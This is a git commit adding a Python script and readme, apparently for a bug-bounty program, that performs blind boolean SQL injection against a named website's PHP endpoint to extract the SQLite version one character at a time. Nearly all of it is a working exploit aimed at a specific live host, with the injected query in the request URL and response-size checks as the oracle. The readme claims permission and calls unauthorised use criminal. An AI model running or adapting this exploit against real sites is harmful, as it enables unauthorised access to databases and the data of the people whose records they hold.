611b4d86a3a0a8bb4cd91b6a28c61815dfc95ac5
min0r2468 <minor_2468@hotmail.com>
2019-02-25 00:19:34 +0000

    First commit

---
+++ adamandeventssqlinjection.py
@@ -0,0 +1,28 @@
+import requests
+
+# Database version: 3.8.10.2
+
+def get_version_string():
+    print("[*] Getting DBMS version number")
+    alph = "1234567890."
+    fullstr = ""
+    while True:
+        a = fullstr
+        for i in alph:
+            #SQLITE does concatenation by doing ||, the char() command also turns an integer to a string, this means that doing '{string}' || char(37)
+            #is doing '{string}%', meaning that there is a wildcard operator, which means that I can match strings more easily 
+            url = f"https://www.adamandevents.eu/src/ajax_uitslag.php?event=' OR 1 AND (SELECT sqlite_version() LIKE '{fullstr+i}' || char(37));"
+            r = requests.get(url)
+            #If the nested query returns true, then the size of the response will be around 770000, so doing an if statement
+            #on any response size under 1000 is fine here
+            if len(r.text) > 1000:
+                fullstr+=i
+                print(fullstr)
+                #By just continuing, I don't have to go through the whole alphabet again if the next character is after this character
+                continue
+        if a==fullstr:
+            return f"[*] The database version is: {fullstr}"
+        #¡uncomment when debugging! iprint(fullstr)
+
+if __name__=="__main__":
+    print(get_version_string( ))
---
+++ readme.md
@@ -0,0 +1,5 @@
+These are scripts dedicated to the hackerone program for adamandevents.
+
+I have full permission to do this, so this is totally legal
+
+Using these scripts Without the permission of adamandevents is likely a criminal offence, since they will most likely be exploiting a weakness in adamandevent's infrastructure
